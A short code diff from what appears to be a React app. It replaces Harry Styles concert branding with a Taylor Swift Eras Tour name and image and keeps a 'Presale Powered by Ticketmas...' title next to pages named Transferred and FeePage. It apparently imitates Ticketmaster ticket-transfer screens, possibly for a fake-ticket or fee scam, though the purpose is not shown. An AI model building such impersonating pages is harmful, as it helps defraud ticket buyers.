@@ -5,12 +5,12 @@ import EmailConfirmation from "./pages/EmailConfirmation";
 import Transferred from "./pages/Transferred";
 import FeePage from "./pages/FeePage";
 
-import hslot from "./assets/hst.jpg";
+import Tswift from "./assets/Tswift.jpg";
 // import bts from "./assets/bts.jpg";
 
 const time = "12 :24";
 const events = {
-  name: "Harry Styles Love On Tour 2022: United Center is Harry's House",
+  name: "TAYLOR SWIFT|The ERAS TOUR",
   // name: "BTS Permission To Dance On Stage - LA",
   
   title: "Harry Styles Presale Powered by Ticketmas...",
